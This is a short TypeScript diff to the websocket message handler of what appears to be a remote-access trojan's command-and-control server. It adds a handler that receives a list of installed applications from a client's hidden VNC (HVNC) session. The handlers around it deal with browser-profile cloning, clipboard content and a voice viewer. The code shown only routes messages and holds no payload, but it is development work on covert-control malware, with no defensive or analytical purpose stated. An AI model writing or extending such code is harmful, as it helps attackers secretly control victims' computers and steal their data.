@@ -154,6 +154,7 @@ type WsLifecycleDeps = {
   handleHVNCCloneProgress: (clientId: string, payload: any) => void;
   handleHVNCLookupResult: (clientId: string, payload: any) => void;
   handleHVNCBrowserCheckResult: (clientId: string, payload: any) => void;
+  handleHVNCInstalledAppsResult: (clientId: string, payload: any) => void;
   handleHVNCDXGIStatus: (clientId: string, payload: any) => void;
   handleClipboardContent: (clientId: string, payload: any) => void;
   cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
@@ -712,6 +713,9 @@ export async function handleWebSocketMessage(
         break;
       case "hvnc_browser_check_result":
         deps.handleHVNCBrowserCheckResult(client.id, payload);
+        break;
+      case "hvnc_installed_apps_result":
+        deps.handleHVNCInstalledAppsResult(client.id, payload);
         break;
       case "hvnc_dxgi_status":
         deps.handleHVNCDXGIStatus(client.id, payload);
